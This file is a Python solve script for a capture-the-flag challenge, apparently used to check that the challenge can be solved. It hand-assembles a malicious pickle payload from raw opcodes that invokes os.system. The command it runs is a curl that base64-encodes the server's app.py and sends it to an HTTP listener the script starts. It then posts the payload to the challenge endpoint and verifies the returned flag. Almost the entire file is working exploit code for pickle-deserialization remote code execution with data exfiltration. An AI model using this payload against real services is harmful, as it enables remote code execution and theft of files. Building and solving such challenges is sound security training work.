import os
import socket
import threading
import time
import urllib
import base64
import re
import requests

from http.server import BaseHTTPRequestHandler, HTTPServer
from pickle import MARK, UNICODE, DICT, STOP, GLOBAL, TUPLE, REDUCE


FLAG = os.environ["FLAG"]
CHAL_HOST = os.environ["CHAL_HOST"]
CHAL_PORT = os.environ["CHAL_PORT"]

SELF_HOST = socket.gethostbyname(socket.gethostname())
CHAL_URL = f"http://{CHAL_HOST}:{CHAL_PORT}/message"
HEALTH_URL = f"http://{CHAL_HOST}:{CHAL_PORT}/healthz"


class InboundHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # strip leading slash and URL-decode
        raw_path = self.path.lstrip("/")

        path = urllib.parse.unquote(raw_path)
        # log remote info + path length
        decoded = base64.b64decode(path).decode()
        flag = re.findall(re.compile(r"blahaj\{.*\}"), decoded)[0]
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK\n")

        os._exit(0 if flag == FLAG else 1)

    # silence default logging to stderr, keep our prints instead
    def log_message(self, format, *args) -> None:
        return


def start_inbound_server(host="0.0.0.0", port=8000):
    server = HTTPServer((host, port), InboundHandler)
    try:
        server.serve_forever()
    except Exception:
        exit()


def healthcheck():
    time.sleep(2)

    r = requests.get(HEALTH_URL)
    r.raise_for_status()


def solve():
    p = b""
    p += b"hack\n"
    p += UNICODE + b"username\n"
    p += GLOBAL + b"os\nsystem\n"
    p += MARK
    p += (
        UNICODE
        + f"curl -X GET http://{SELF_HOST}:8000/$(cat app.py | base64 -w 0)\n".encode()
    )
    p += TUPLE + REDUCE
    p += UNICODE + b"nonsense\n" + UNICODE + b"nonsense"

    username = "rawr"
    creds = MARK
    creds += UNICODE + b"username\n" + UNICODE + username.encode() + b"\n"
    creds += UNICODE + b"password\n" + UNICODE + p + b"\n"
    creds += DICT
    creds += STOP

    t = threading.Thread(
        target=start_inbound_server,
        kwargs={"host": "0.0.0.0", "port": 8000},
        daemon=True,
    )
    t.start()

    data = {"username": username, "message": p.decode()}
    with requests.Session() as s:
        s.post(CHAL_URL, data=data)

    while True:
        time.sleep(1)


if __name__ == "__main__":
    healthcheck()
    solve()
